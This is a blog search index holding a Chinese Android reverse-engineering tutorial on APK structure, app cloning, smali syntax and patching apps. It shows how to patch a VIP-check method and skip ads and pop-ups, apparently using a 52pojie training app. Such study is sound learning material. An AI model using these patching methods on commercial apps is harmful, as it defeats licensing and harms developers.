<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2024/10/30/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"/>
      <url>/2024/10/30/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="安卓逆向"><a href="#安卓逆向" class="headerlink" title="安卓逆向"></a>安卓逆向</h1><h2 id="一、静态初识"><a href="#一、静态初识" class="headerlink" title="一、静态初识"></a>一、静态初识</h2><h3 id="1-环境安装，直接看正己师傅的52教程就行，面具部分需要Kitsune-Mask"><a href="#1-环境安装，直接看正己师傅的52教程就行，面具部分需要Kitsune-Mask" class="headerlink" title="1.环境安装，直接看正己师傅的52教程就行，面具部分需要Kitsune Mask"></a>1.环境安装，直接看正己师傅的52教程就行，面具部分需要Kitsune Mask</h3><p>​<a href="https://www.52pojie.cn/thread-1695141-1-1.html">直通链接</a></p><hr><hr><h3 id="2-认识Apk结构、双开、汉化和基础修改"><a href="#2-认识Apk结构、双开、汉化和基础修改" class="headerlink" title="2.认识Apk结构、双开、汉化和基础修改"></a>2.认识Apk结构、双开、汉化和基础修改</h3><p>由于这个教程是22年出的，np管理器没有现在好用，所以正己师傅用的mt和np管理器一起用的。</p><p>现在np管理器功能和mt基本没什么区别，所以用mt的部分直接用np管理器就行。</p><h4 id="Apk结构"><a href="#Apk结构" class="headerlink" title="Apk结构"></a>Apk结构</h4><table><thead><tr><th>文件</th><th>注释</th></tr></thead><tbody><tr><td>assets目录</td><td>存放APK静态文件资源的地方，像视频，音频，图片等</td></tr><tr><td>lib目录</td><td>armeabi-v7a基本通用所有android设备，<br>arm64-v8a只适用于64位的android设备，<br>x86常见用于android模拟器，<br>其目录下的.so文件是c或c++编译的动态链接库文件</td></tr><tr><td>META-INF目录</td><td>保存应用的签名信息，签名信息可以验证APK文件的完整性，相当于APK的身份证(验证文件是否又被修改)</td></tr><tr><td>res目录</td><td>res目录存放资源文件，包括图片，字符串等等，APK的脸蛋由他的<font color="fish">layout</font>t文件设计</td></tr><tr><td>AndroidManifest.xml文件</td><td>APK的应用清单信息，它描述了应用的名字，版本，权限，引用的库文件等等信息</td></tr><tr><td>classes.dex文件</td><td>classes.dex是java源码编译后生成的java字节码文件，APK运行的主要逻辑</td></tr><tr><td>resources.arsc文件</td><td>resources.arsc是编译后的二进制资源文件，它是一个映射表，映射着资源和id，通过R文件中的id就可以找到对应的资源</td></tr></tbody></table><hr><h4 id="双开原理"><a href="#双开原理" class="headerlink" title="双开原理"></a>双开原理</h4><p>这里主要演示的是改包名，如果有签名校验双开会失败，第二个软件会出现闪退等情况</p><table><thead><tr><th>原理</th><th>解释</th></tr></thead><tbody><tr><td>修改包名</td><td>让手机系统认为这是2个APP，这样的话就能生成2个数据存储路径，此时的多开就等于你打开了两个互不干扰的APP</td></tr><tr><td>修改Framework</td><td>对于有系统修改权限的厂商，可以修改Framework来实现双开的目的，例如：小米自带多开</td></tr><tr><td>通过虚拟化技术实现</td><td>虚拟Framework层、虚拟文件系统、模拟Android对组件的管理、虚拟应用进程管理 等一整套虚拟技术，将APK复制一份到虚拟空间中运行，例如：平行空间</td></tr><tr><td>以插件机制运行</td><td>利用反射替换，动态代{过}{滤}理，hook了系统的大部分与system—server进程通讯的函数，以此作为“欺上瞒下”的目的，欺骗系统“以为”只有一个apk在运行，瞒过插件让其“认为”自己已经安装。例如：VirtualApp</td></tr></tbody></table><p>1.安装程序之后用np管理器进行安装包提取</p><p>2.点击提取出的安装包后点击”功能“选项</p><p>3.点击安装包共存，更改包名</p><hr><h4 id="Apk汉化"><a href="#Apk汉化" class="headerlink" title="Apk汉化"></a>Apk汉化</h4><p>汉化：使用专门的工具对外文版的软件资源进行读取、翻译、修改、回写等一系列处理，使软件的菜单、对话框、提示等用户界面显示为中文，而程序的内核和功能保持不变，这个过程即为软件汉化</p><p><strong>基本上字符串都是在arsc里，建议一键汉化，然后再润色。</strong></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/AndroidRe/HuanHuaLiuCheng.png" alt="HuanHuaLiuCheng"></p><p>除了图中的汉化方式还有更加邪门的将字符写进.so文件中的</p><p>（以下方法不是适合用在.so文件中）</p><p>1.开发工具进行字符提取</p><p>2.在安装包中进行高级搜索，搜索字符所在文件位置</p><p>3.将字符进行翻译替换</p><p>4.重新编译签名安装</p><hr><h4 id="初识AndroidManifest-xml"><a href="#初识AndroidManifest-xml" class="headerlink" title="初识AndroidManifest.xml"></a>初识AndroidManifest.xml</h4><p>AndroidManifest.xml文件是整个应用程序的信息描述文件，定义了应用程序中包含的Activity,Service,Content provider和BroadcastReceiver组件信息。每个应用程序在根目录下<font color="fish">必须包含一个AndroidManifest.xml</font>文件，且文件名不能修改。它描述了package中暴露的组件，他们各自的实现类，各种能被处理的数据和启动位置。</p><table><thead><tr><th align="left">属性</th><th align="left">定义</th></tr></thead><tbody><tr><td align="left">versionCode</td><td align="left">版本号，主要用来更新，例如:12</td></tr><tr><td align="left">versionName</td><td align="left">版本名，给用户看的，例如:1.2</td></tr><tr><td align="left">package</td><td align="left">包名，例如：com.zj.52pj.demo</td></tr><tr><td align="left">uses-permission android:name&#x3D;””</td><td align="left">应用权限，例如：android.permission.INTERNET 代表网络权限</td></tr><tr><td align="left">android:label&#x3D;”@string&#x2F;app_name”</td><td align="left">应用名称</td></tr><tr><td align="left">android:icon&#x3D;”@mipmap&#x2F;ic_launcher”</td><td align="left">应用图标路径</td></tr><tr><td align="left">android:debuggable&#x3D;”true”</td><td align="left">应用是否开启debug权限</td></tr></tbody></table><p>想要更改程序图标和名字的话，可以使用np管理器的“通用编辑”进行更改</p><hr><hr><h3 id="3-初识smali，vip终结者"><a href="#3-初识smali，vip终结者" class="headerlink" title="3.初识smali，vip终结者"></a>3.<strong>初识smali，vip终结者</strong></h3><h4 id="什么是JVM、Dalvik、ART"><a href="#什么是JVM、Dalvik、ART" class="headerlink" title="什么是JVM、Dalvik、ART"></a>什么是JVM、Dalvik、ART</h4><p>JVM是JAVA虚拟机，运行JAVA字节码程序<br>Dalvik是Google专门为Android设计的一个虚拟机，Dalvik有专属的文件执行格式dex(Dalvik executable)<br>Art(Android Runtime)相当于Dalvik的升级版，本质与Dalvik无异</p><h4 id="smail及其语法"><a href="#smail及其语法" class="headerlink" title="smail及其语法"></a>smail及其语法</h4><p>smali是Dalvik的寄存器语言，smali代码是dex反编译而来的</p><h5 id="关键字："><a href="#关键字：" class="headerlink" title="关键字："></a>关键字：</h5><table><thead><tr><th align="left">名称</th><th align="left">注释</th></tr></thead><tbody><tr><td align="left">.class</td><td align="left">类名</td></tr><tr><td align="left">.super</td><td align="left">父类名，继承的上级类名名称</td></tr><tr><td align="left">.source</td><td align="left">源名</td></tr><tr><td align="left">.field</td><td align="left">变量</td></tr><tr><td align="left">.method</td><td align="left">方法名</td></tr><tr><td align="left">.register</td><td align="left">寄存器</td></tr><tr><td align="left">.end method</td><td align="left">方法名的结束</td></tr><tr><td align="left">public</td><td align="left">公有</td></tr><tr><td align="left">protected</td><td align="left">半公开，只有同一家人才能用</td></tr><tr><td align="left">private</td><td align="left">私有，只能自己使用</td></tr><tr><td align="left">.parameter</td><td align="left">方法参数</td></tr><tr><td align="left">.prologue</td><td align="left">方法开始</td></tr><tr><td align="left">.line xxx</td><td align="left">位于第xxx行</td></tr></tbody></table><h5 id="数据类型对应"><a href="#数据类型对应" class="headerlink" title="数据类型对应"></a>数据类型对应</h5><table><thead><tr><th align="left">smali类型</th><th align="left">java类型</th><th align="left">注释</th></tr></thead><tbody><tr><td align="left">V</td><td align="left">void</td><td align="left">无返回值</td></tr><tr><td align="left">Z</td><td align="left">boolean</td><td align="left">布尔值类型，返回0或1</td></tr><tr><td align="left">B</td><td align="left">byte</td><td align="left">字节类型，返回字节</td></tr><tr><td align="left">S</td><td align="left">short</td><td align="left">短整数类型，返回数字</td></tr><tr><td align="left">C</td><td align="left">char</td><td align="left">字符类型，返回字符</td></tr><tr><td align="left">I</td><td align="left">int</td><td align="left">整数类型，返回数字</td></tr><tr><td align="left">J</td><td align="left">long （64位 需要2个寄存器存储）</td><td align="left">长整数类型，返回数字</td></tr><tr><td align="left">F</td><td align="left">float</td><td align="left">单浮点类型，返回数字</td></tr><tr><td align="left">D</td><td align="left">double （64位 需要2个寄存器存储）</td><td align="left">双浮点类型，返回数字</td></tr><tr><td align="left">string</td><td align="left">String</td><td align="left">文本类型，返回字符串</td></tr><tr><td align="left">Lxxx&#x2F;xxx&#x2F;xxx</td><td align="left">object</td><td align="left">对象类型，返回对象</td></tr></tbody></table><h5 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h5><table><thead><tr><th align="left">关键字</th><th align="left">注释</th></tr></thead><tbody><tr><td align="left">const</td><td align="left">重写整数属性，真假属性内容，只能是数字类型</td></tr><tr><td align="left">const-string</td><td align="left">重写字符串内容</td></tr><tr><td align="left">const-wide</td><td align="left">重写长整数类型，多用于修改到期时间。</td></tr><tr><td align="left">return</td><td align="left">返回指令</td></tr><tr><td align="left">if-eq</td><td align="left">全称equal(a&#x3D;b)，比较寄存器ab内容，相同则跳</td></tr><tr><td align="left">if-ne</td><td align="left">全称not equal(a!&#x3D;b)，ab内容不相同则跳</td></tr><tr><td align="left">if-eqz</td><td align="left">全称equal zero(a&#x3D;0)，z即是0的标记，a等于0则跳</td></tr><tr><td align="left">if-nez</td><td align="left">全称not equal zero(a!&#x3D;0)，a不等于0则跳</td></tr><tr><td align="left">if-ge</td><td align="left">全称greater equal(a&gt;&#x3D;b)，a大于或等于则跳</td></tr><tr><td align="left">if-le</td><td align="left">全称little equal(a&lt;&#x3D;b)，a小于或等于则跳</td></tr><tr><td align="left">goto</td><td align="left">强制跳到指定位置</td></tr><tr><td align="left">switch</td><td align="left">分支跳转，一般会有多个分支线，并根据指令跳转到适当位置</td></tr><tr><td align="left">iget</td><td align="left">获取寄存器数据</td></tr></tbody></table><p>其余指令可用语法工具查询</p><p>定位方法：搜索弹窗关键字、抓取按钮id</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一个私有、静态、不可变的方法   方法名</span></span><br><span class="line">.method <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> onCreate$lambda-<span class="number">2</span>(Lkotlin/jvm/internal/Ref$IntRef;Lcom/zj/wuaipojie/ui/ChallengeSecond;Landroid/widget/ImageView;Landroid/widget/ImageView;Landroid/widget/ImageView;Landroid/view/View;)Z <span class="comment">//(这里面是方法的参数)这里是方法返回值类型，表示布尔值类型，返回假或真</span></span><br><span class="line">    .registers <span class="number">7</span>  <span class="comment">//寄存器数量</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">33</span>  <span class="comment">//代码所在的行数</span></span><br><span class="line">    iget p0, p0, Lkotlin/jvm/internal/Ref$IntRef;-&gt;element:I  <span class="comment">//读取p0(第一个参数，参考寄存器知识)中element的值赋值给p0</span></span><br><span class="line"></span><br><span class="line">    const/<span class="number">4</span> p5, <span class="number">0x1</span>  <span class="comment">//p5赋值1</span></span><br><span class="line"></span><br><span class="line">    const/<span class="number">16</span> v0, <span class="number">0xa</span> <span class="comment">//v0赋值10，在16进制里a表示10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>-ge p0, v0, :cond_15  <span class="comment">//判断p0的值是否大于或等于v0的值(即p0的值是否大于或等于10)，如果大于或等于则跳转到:cond_15</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">34</span>  <span class="comment">//以下是常见的Toast弹窗代码</span></span><br><span class="line">    check-cast p1, Landroid/content/Context; <span class="comment">//检查Context对象引用</span></span><br><span class="line"></span><br><span class="line">    const-string p0, <span class="string">&quot;请先获取10个硬币哦&quot;</span> <span class="comment">//弹窗文本信息，把&quot;&quot;里的字符串数据赋值给p0</span></span><br><span class="line"></span><br><span class="line">    check-cast p0, Ljava/lang/CharSequence; <span class="comment">//检查CharSequence对象引用</span></span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;p1, p0, p5&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast; </span><br><span class="line">    <span class="comment">//将弹窗文本、显示时间等信息传给p1</span></span><br><span class="line"></span><br><span class="line">    move-result-object p0  <span class="comment">//结果传递给p0</span></span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0&#125;, Landroid/widget/Toast;-&gt;show()V  <span class="comment">//当看到这个Toast;-&gt;show你就应该反应过来这里是弹窗代码</span></span><br><span class="line"></span><br><span class="line">    goto :goto_31  <span class="comment">//跳转到:goto_31</span></span><br><span class="line"></span><br><span class="line">    :cond_15 <span class="comment">//跳转的一个地址</span></span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p1&#125;, Lcom/zj/wuaipojie/ui/ChallengeSecond;-&gt;isvip()Z  <span class="comment">//判断isvip方法的返回值是否为真(即结果是否为1)</span></span><br><span class="line"></span><br><span class="line">    move-result p0  <span class="comment">//结果赋值给p0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>-eqz p0, :cond_43 <span class="comment">//如果结果为0则跳转cond_43地址</span></span><br><span class="line"></span><br><span class="line">    const p0, <span class="number">0x7f0d0018</span>  <span class="comment">//在arsc中的id索引，这个值可以进行查询</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">37</span></span><br><span class="line">    invoke-virtual &#123;p2, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V <span class="comment">//设置图片资源</span></span><br><span class="line"></span><br><span class="line">    const p0, <span class="number">0x7f0d0008</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">38</span></span><br><span class="line">    invoke-virtual &#123;p3, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V</span><br><span class="line"></span><br><span class="line">    const p0, <span class="number">0x7f0d000a</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">39</span></span><br><span class="line">    invoke-virtual &#123;p4, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">40</span></span><br><span class="line">    sget-object p0, Lcom/zj/wuaipojie/util/SPUtils;-&gt;INSTANCE:Lcom/zj/wuaipojie/util/SPUtils; </span><br><span class="line"></span><br><span class="line">    check-cast p1, Landroid/content/Context;</span><br><span class="line"></span><br><span class="line">    const/<span class="number">4</span> p2, <span class="number">0x2</span> <span class="comment">//p2赋值2</span></span><br><span class="line"></span><br><span class="line">    const-string p3, <span class="string">&quot;level&quot;</span> <span class="comment">//sp的索引</span></span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0, p1, p3, p2&#125;, Lcom/zj/wuaipojie/util/SPUtils;-&gt;saveInt(Landroid/content/Context;Ljava/lang/String;I)V <span class="comment">//写入数据</span></span><br><span class="line"></span><br><span class="line">    goto :goto_50 <span class="comment">//跳转地址</span></span><br><span class="line"></span><br><span class="line">    :cond_43</span><br><span class="line"></span><br><span class="line">    check-cast p1, Landroid/content/Context;</span><br><span class="line"></span><br><span class="line">    const-string p0, <span class="string">&quot;\u8bf7\u5148\u5145\u503c\u5927\u4f1a\u5458\u54e6\uff01&quot;</span> <span class="comment">//请先充值大会员哦！</span></span><br><span class="line"></span><br><span class="line">    check-cast p0, Ljava/lang/CharSequence;</span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;p1, p0, p5&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;</span><br><span class="line"></span><br><span class="line">    move-result-object p0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0&#125;, Landroid/widget/Toast;-&gt;show()V</span><br><span class="line"></span><br><span class="line">    :goto_50</span><br><span class="line">    <span class="keyword">return</span> p5  <span class="comment">//返回p5的值</span></span><br><span class="line">.end method <span class="comment">//方法结束</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否是大会员的方法</span></span><br><span class="line">.method <span class="keyword">public</span> <span class="keyword">final</span> <span class="title function_">isvip</span><span class="params">()</span>Z</span><br><span class="line">    .registers <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    const/<span class="number">4</span> v0, <span class="number">0x0</span> <span class="comment">//v0赋值0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v0 <span class="comment">//返回v0的值</span></span><br><span class="line"></span><br><span class="line">.end method</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改方法：修改判断、强制跳转、修改寄存器的值</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/AndroidRe/KeyPoint.png" alt="KeyPoint"></p><h4 id="寄存器-你要是会用ida或者看过汇编就很容易明白"><a href="#寄存器-你要是会用ida或者看过汇编就很容易明白" class="headerlink" title="寄存器(你要是会用ida或者看过汇编就很容易明白)"></a>寄存器(你要是会用ida或者看过汇编就很容易明白)</h4><p>smali里的所有操作都必须经过寄存器来进行:本地寄存器用v开头数字结尾的符号来表示，如v0、 v1、v2。 参数寄存器则使用p开头数字结尾的符号来表示，如p0、p1、p2。特别注意的是，p0不一定是函数中的第一个参数，在非static函数中，p0代指“this”，p1表示函数的第一个 参数，p2代表函数中的第二个参数。而在static函数中p0才对应第一个参数(因为Java的static方法中没有this方法）</p><hr><hr><h3 id="4-恭喜你获得广告-弹窗静默卡"><a href="#4-恭喜你获得广告-弹窗静默卡" class="headerlink" title="4.恭喜你获得广告&amp;弹窗静默卡"></a>4.恭喜你获得广告&amp;弹窗静默卡</h3><h4 id="1-广告类型"><a href="#1-广告类型" class="headerlink" title="1.广告类型"></a>1.广告类型</h4><p>启动广告   弹窗&amp;更新广告  横幅广告</p><h4 id="2-安卓四大组件"><a href="#2-安卓四大组件" class="headerlink" title="2.安卓四大组件"></a>2.安卓四大组件</h4><table><thead><tr><th align="left">组件</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">Activity(活动)</td><td align="left">在应用中的一个Activity可以用来表示一个界面，意思可以理解为“活动”，即一个活动开始，代表 Activity组件启动，活动结束，代表一个Activity的生命周期结束。一个Android应用必须通过Activity来运行和启动，Activity的生命周期交给系统统一管理。</td></tr><tr><td align="left">Service(服务)</td><td align="left">Service它可以在后台执行长时间运行操作而没有用户界面的应用组件，不依赖任何用户界面，例如后台播放音乐，后台下载文件等。</td></tr><tr><td align="left">Broadcast Receiver(广播接收器)</td><td align="left">一个用于接收广播信息，并做出对应处理的组件。比如我们常见的系统广播：通知时区改变、电量低、用户改变了语言选项等。</td></tr><tr><td align="left">Content Provider(内容提供者)</td><td align="left">作为应用程序之间唯一的共享数据的途径，Content Provider主要的功能就是存储并检索数据以及向其他应用程序提供访问数据的接口。Android内置的许多数据都是使用Content Provider形式，供开发者调用的（如视频，音频，图片，通讯录等）</td></tr></tbody></table><h5 id="1-activity的切换"><a href="#1-activity的切换" class="headerlink" title="1.activity的切换"></a>1.activity的切换</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;!---声明实现应用部分可视化界面的 Activity，必须使用 AndroidManifest 中的 &lt;activity&gt; 元素表示所有 Activity。系统不会识别和运行任何未进行声明的Activity。-----&gt;</span><br><span class="line">       &lt;activity  </span><br><span class="line">           android:label=<span class="string">&quot;@string/app_name&quot;</span>  </span><br><span class="line">           android:name=<span class="string">&quot;com.zj.wuaipojie.ui.MainActivity&quot;</span>  </span><br><span class="line">           android:exported=<span class="string">&quot;true&quot;</span>&gt;  &lt;!--当前Activity是否可以被另一个Application的组件启动：<span class="literal">true</span>允许被启动；<span class="literal">false</span>不允许被启动--&gt;</span><br><span class="line">           &lt;!---指明这个activity可以以什么样的意图(intent)启动---&gt;</span><br><span class="line">           &lt;intent-filter&gt;  </span><br><span class="line">               &lt;!--表示activity作为一个什么动作启动，android.intent.action.MAIN表示作为主activity启动---&gt;</span><br><span class="line">               &lt;action  </span><br><span class="line">                   android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;  </span><br><span class="line">               &lt;!--这是action元素的额外类别信息，android.intent.category.LAUNCHER表示这个activity为当前应用程序优先级最高的Activity--&gt;</span><br><span class="line">               &lt;category  </span><br><span class="line">                   android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;  </span><br><span class="line">           &lt;/intent-filter&gt;  </span><br><span class="line">       &lt;/activity&gt;  </span><br><span class="line">       &lt;activity  </span><br><span class="line">           android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFirst&quot;</span> /&gt;</span><br><span class="line">       &lt;activity  </span><br><span class="line">           android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFifth&quot;</span>  </span><br><span class="line">           android:exported=<span class="string">&quot;true&quot;</span> /&gt;  </span><br><span class="line">       &lt;activity  </span><br><span class="line">           android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFourth&quot;</span>  </span><br><span class="line">           android:exported=<span class="string">&quot;true&quot;</span> /&gt;  </span><br><span class="line">       &lt;activity  </span><br><span class="line">           android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeThird&quot;</span>  </span><br><span class="line">           android:exported=<span class="string">&quot;false&quot;</span> /&gt;  </span><br><span class="line">       &lt;activity  </span><br><span class="line">           android:name=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeSecond&quot;</span>  </span><br><span class="line">           android:exported=<span class="string">&quot;false&quot;</span> /&gt;  </span><br><span class="line">       &lt;activity  </span><br><span class="line">           android:name=<span class="string">&quot;com.zj.wuaipojie.ui.AdActivity&quot;</span> /&gt;  </span><br></pre></td></tr></table></figure><p>启动广告流程：<br>启动Activity-&gt;广告Activity-&gt;主页Activity</p><p>修改方法：<br>1.修改加载时间<br>2.Acitivity切换定位，修改Intent的Activity类名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (position) &#123;  </span><br><span class="line">           <span class="keyword">case</span> <span class="number">0</span>:  </span><br><span class="line">               <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  </span><br><span class="line">               intent.setClass(it.getContext(), ChallengeFirst.class);  </span><br><span class="line">               it.getContext().startActivity(intent);  </span><br><span class="line">               <span class="keyword">return</span>;  </span><br><span class="line">           <span class="keyword">case</span> <span class="number">1</span>:  </span><br><span class="line">               <span class="type">Intent</span> <span class="variable">intent2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  </span><br><span class="line">               intent2.setClass(it.getContext(), ChallengeSecond.class);  </span><br><span class="line">               it.getContext().startActivity(intent2);  </span><br><span class="line">               <span class="keyword">return</span>;  </span><br><span class="line">           <span class="keyword">case</span> <span class="number">2</span>:  </span><br><span class="line">               <span class="type">Intent</span> <span class="variable">intent3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  <span class="comment">//new一个Intent，</span></span><br><span class="line">               intent3.setClass(it.getContext(), AdActivity.class);  <span class="comment">//传入要切换的Acitivity的类名</span></span><br><span class="line">               it.getContext().startActivity(intent3);  <span class="comment">//启动对应的Activity</span></span><br><span class="line">               <span class="keyword">return</span>;  </span><br><span class="line">           <span class="keyword">case</span> <span class="number">3</span>:  </span><br><span class="line">               <span class="type">Intent</span> <span class="variable">intent4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();  </span><br><span class="line">               intent4.setClass(it.getContext(), ChallengeFourth.class);  </span><br><span class="line">               it.getContext().startActivity(intent4);  </span><br><span class="line">               <span class="keyword">return</span>; </span><br><span class="line">           <span class="keyword">default</span>:  </span><br><span class="line">               <span class="keyword">return</span>;  </span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><h4 id="3-Activity生命周期"><a href="#3-Activity生命周期" class="headerlink" title="3.Activity生命周期"></a>3.Activity生命周期</h4><table><thead><tr><th align="left">函数名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">onCreate()</td><td align="left">一个Activity启动后第一个被调用的函数，常用来在此方法中进行Activity的一些初始化操作。例如创建View，绑定数据，注册监听，加载参数等。</td></tr><tr><td align="left">onStart()</td><td align="left">当Activity显示在屏幕上时，此方法被调用但此时还无法进行与用户的交互操作。</td></tr><tr><td align="left">onResume()</td><td align="left">这个方法在onStart()之后调用，也就是在Activity准备好与用户进行交互的时候调用，此时的Activity一定位于Activity栈顶，处于运行状态。</td></tr><tr><td align="left">onPause()</td><td align="left">这个方法是在系统准备去启动或者恢复另外一个Activity的时候调用，通常在这个方法中执行一些释放资源的方法，以及保存一些关键数据。</td></tr><tr><td align="left">onStop()</td><td align="left">这个方法是在Activity完全不可见的时候调用的。</td></tr><tr><td align="left">onDestroy()</td><td align="left">这个方法在Activity销毁之前调用，之后Activity的状态为销毁状态。</td></tr><tr><td align="left">onRestart()</td><td align="left">当Activity从停止stop状态恢进入start状态时调用状态。</td></tr></tbody></table><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/AndroidRe/Activity%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt="Activity生命周期"></p><h4 id="4-弹窗定位-堆栈分析"><a href="#4-弹窗定位-堆栈分析" class="headerlink" title="4.弹窗定位&amp;堆栈分析"></a>4.弹窗定位&amp;堆栈分析</h4><hr><p>修改方法：<br>1.修改xml中的versiocode<br>2.Hook弹窗(推荐算法助手开启弹窗定位)<br>3.修改dex弹窗代码<br>4.抓包修改响应体(也可以路由器拦截)</p><h4 id="5-布局优化"><a href="#5-布局优化" class="headerlink" title="5.布局优化"></a>5.布局优化</h4><hr><p>1.开发者助手抓布局<br>2.MT管理器xml搜索定位<br>3.修改xml代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android:visibility=&quot;gone&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn常用脚本模板</title>
      <link href="/2024/08/16/pwn%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%E6%A8%A1%E6%9D%BF/"/>
      <url>/2024/08/16/pwn%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%E6%A8%A1%E6%9D%BF/</url>
      
